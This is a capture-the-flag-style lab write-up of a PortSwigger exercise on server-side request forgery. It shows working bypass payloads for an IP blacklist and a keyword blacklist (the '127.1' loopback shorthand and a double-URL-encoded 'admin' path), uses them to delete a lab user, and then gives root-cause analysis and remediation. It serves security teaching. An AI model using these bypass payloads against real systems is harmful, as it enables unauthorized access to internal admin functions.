# Lab 03 — SSRF with Blacklist-Based Input Filter

## 1. Overview

| Field | Value |
|---|---|
| Vulnerability Class | Server-Side Request Forgery (Blacklist Filter Bypass) |
| CWE | CWE-918 |
| Difficulty | Practitioner |
| Source | PortSwigger Web Security Academy |
| Objective | Bypass two weak anti-SSRF blacklist defenses to reach `http://localhost/admin` and delete user `carlos` |

## 2. Summary

This application adds two blacklist-style defenses on top of the same stock-checker SSRF primitive seen in Lab 01: it rejects URLs containing the literal strings `127.0.0.1`/`localhost`, and separately rejects URLs whose path contains the word `admin`. Blacklists validate specific string patterns rather than the actual resolved meaning of the input, so each defense can be bypassed independently using an equivalent representation that isn't on the blocklist but is still interpreted identically by the underlying network/HTTP stack.

## 3. Proof of Concept (PoC)

1. Open a product page, click **Check stock**, capture the request, and send it to Repeater.
2. Submit `stockApi=http://127.0.0.1/` — observe the request is blocked by the IP-based blacklist.
3. Bypass the IP filter using an alternate loopback representation: `stockApi=http://127.1/` — the request is no longer blocked.
4. Submit `stockApi=http://127.1/admin` — observe this is blocked by the second, keyword-based filter.
5. Bypass the keyword filter by double-URL-encoding the letter `a` in `admin` (`a` → `%61` → `%2561`): `stockApi=http://127.1/%2561dmin` — the admin panel is returned.
6. Locate the delete link in the response and submit `stockApi=http://127.1/%2561dmin/delete?username=carlos` to complete the deletion.

## 4. Evidence

**Bypass 1 — IP blacklist:**
```
stockApi=http://127.0.0.1/      → blocked ("external stock check blocked")
stockApi=http://127.1/          → 200/404, not blocked
```

**Bypass 2 — keyword blacklist:**
```
stockApi=http://127.1/admin             → blocked
stockApi=http://127.1/%2561dmin         → 200 OK, admin panel HTML returned
```

**Deletion:**
```
stockApi=http://127.1/%2561dmin/delete?username=carlos
```
Response: `200 OK`, lab marked **Solved**.

## 5. Root Cause Analysis

**Attacker perspective:** Two independent parsing gaps are exploited:
- `127.1` is accepted by most IP-parsing libraries as shorthand for `127.0.0.1` (the remaining octets are implicitly zero-filled), so the literal string `127.0.0.1` never appears for the blacklist to match against.
- The server decodes the request URL once before checking the blacklist, sees `%61dmin` (not the literal word `admin`), and passes the filter. However, the component that actually performs the back-end HTTP request decodes the value a second time, finally reconstructing the literal `/admin` path it requests.

**Defender perspective:** Blacklisting is inherently reactive — it tries to enumerate every malicious-looking string rather than validating what the input actually resolves to. Alternate IP notations and inconsistent/multiple rounds of URL decoding between the validating component and the requesting component are both well-known, systemic weaknesses of this approach.

## 6. Impact

Identical to Lab 01 (full access to an unauthenticated admin interface, user deletion), but demonstrates that superficial "security" filtering provides a false sense of protection and is not a substitute for proper request-destination validation.

## 7. Remediation

- Replace blacklist filtering with strict allowlist validation performed against the fully-resolved, canonical form of the destination (hostname and IP address), not the raw input string.
- Normalize/decode the URL exactly once, in the same component that performs the validation and the one that performs the request, eliminating double-decoding discrepancies.
- Reject any non-standard/alternate IP address notation outright, rather than attempting to enumerate and block each variant.
- Pair input validation with network-level egress controls so that even a bypassed filter cannot reach unintended destinations.

## 8. References

- [PortSwigger — SSRF with blacklist-based input filter](https://portswigger.net/web-security/ssrf)
- [CWE-918](https://cwe.mitre.org/data/definitions/918.html)
